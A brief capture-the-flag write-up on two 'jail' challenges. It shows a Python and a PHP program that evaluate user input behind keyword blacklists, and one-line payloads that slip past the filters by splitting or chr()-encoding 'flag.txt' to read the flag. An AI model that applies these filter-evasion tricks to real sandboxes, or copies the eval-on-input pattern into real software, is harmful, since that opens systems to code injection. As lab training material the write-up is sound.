# Jail 1

1.the source code 
```python
#!/usr/local/bin/python

from shell import shell

  

blacklist = ["flag", "locals", "vars", "\\", "{", "}"]

  

banner = '''

========================

=    Eevee's Jail 1    =

========================

'''

  

print(banner)

  

for _ in [shell]:

    while True:

        try:

            huh = ascii(input("[+] > "))

            if any(no in huh for no in blacklist):

                raise ValueError("[!] Mission Failed. Try again.")

            exec(eval(huh))

        except Exception as err:

            print(f"{err}")
```

2.since we cannot enter flag we just sperate it 
```
print(open('fla'+'g.txt').read())
```

![[Pasted image 20250512020327.png]]

# Jail 4

1.the source code 
```php
<?php

  

echo "========================\n";

echo "=    Eevee's Jail 4    =\n";

echo "========================\n";

  

echo "[+] > ";

$var = trim(fgets(STDIN));

  

if($var == null) die("[?] Input needed to escape this prison\n");

  

function filter($var) {

        if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var)) {

                return false;

        }

        return true;

}

if(filter($var)) {

        eval($var);

} else {

        echo "[!] Restricted characters has been used";

}

echo "\n";

?>
```

2.there is just one eval thus we cannot separate , so i just to convert flag.txt to ascii , let us prompt gpt to help us achieve this idea . 
```
print(file_get_contents(chr(102).chr(108).chr(97).chr(103).chr(46).chr(116).chr(120).chr(116)));
```

![[Pasted image 20250512021056.png]]